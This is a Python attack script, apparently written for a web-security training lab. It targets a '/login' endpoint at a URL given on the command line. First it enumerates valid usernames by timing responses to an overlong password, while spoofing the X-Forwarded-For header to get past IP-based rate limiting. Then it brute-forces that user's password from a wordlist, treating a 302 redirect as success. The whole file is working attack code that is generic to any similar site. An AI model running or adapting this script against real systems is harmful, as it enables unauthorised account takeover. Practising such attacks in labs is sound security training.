import requests
import sys
import urllib3
import random
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

safe_user = {'username' : 'wiener' , 'password' : 'peter'}
username_list = r"C:\Users\acalarco\Desktop\p\ptest\wordlist\usernames.txt"
password_list = r"C:\Users\acalarco\Desktop\p\ptest\wordlist\passwords.txt"


def perform_request(url,username,password):
    uri = "/login"
    cookies = {'session' : 'APIpZdukZffvAuPv9v9XMVaESe5RmUFc'}
    data = {'username' : username , 'password' : password}
    headers = {'X-Forwarded-For' : str(random.randint(1,500))}
    r = requests.post(url + uri, data=data, cookies=cookies, headers=headers, allow_redirects=False, verify=False, proxies=proxies)
    return r

def username_enumerator(url,username_list):
    long_random_psw = "testX"*100
    with open(username_list, 'r') as u:
        test_list = u.readlines()
        testlist_length = len(test_list)
        for i in range(0,testlist_length):
            username = test_list[i].split("\n")[0]
            sys.stdout.write("[+] Testando il nome utente %s\r" % username)
            sys.stdout.flush()
            response = perform_request(url,username,long_random_psw)
            if response.elapsed.total_seconds() >= 1.0:
                print("\n[+] Nome utente trovato! E' {0}\n[+] Tempo di risposta: {1}".format(username,str(response.elapsed.total_seconds())))
                u.close()
                return username
            sys.stdout.write("\033[K")
            i += 1
        u.close()
    return False

def password_enumerator(url,username,password_list):
    with open(password_list) as p:
        for x in p:
            password = x.split("\n")[0]
            sys.stdout.write("[+] Sto testando la password %s\r" % password)
            sys.stdout.flush()
            response = perform_request(url,username,password)
            if response.status_code == 302:
                print("\n[+] Password trovata! E' %s" % password)
                return
            sys.stdout.write("\033[K")



if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Utilizzo: %s <url>" % sys.argv[0])
        print("[-] Esempio: %s www.example.com" % sys.argv[0])
        sys.exit()

    username = username_enumerator(url,username_list)
    if not username:
        print("[-] Username non trovato")

    else:
        password_enumerator(url,username,password_list)